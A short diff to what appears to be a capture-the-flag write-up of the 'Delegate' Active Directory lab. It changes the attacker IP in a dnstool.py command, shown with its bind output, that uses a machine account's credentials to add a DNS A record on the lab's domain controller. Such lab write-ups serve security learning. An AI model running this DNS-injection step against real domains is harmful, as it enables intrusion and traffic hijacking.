@@ -436,7 +436,7 @@ Then, we add this DNS record:
 <br />
 
 ```bash
-❯ python3 dnstool.py -u 'delegate.vl\theredp4nther$' -p 'Red123!' --action add --record theredp4nther.delegate.vl --data 10.10.14.235 --type A -dns-ip 10.129.34.106 dc1.delegate.vl
+❯ python3 dnstool.py -u 'delegate.vl\theredp4nther$' -p 'Red123!' --action add --record theredp4nther.delegate.vl --data 10.10.14.253 --type A -dns-ip 10.129.34.106 dc1.delegate.vl
 [-] Connecting to host...
 [-] Binding to host
 [+] Bind OK
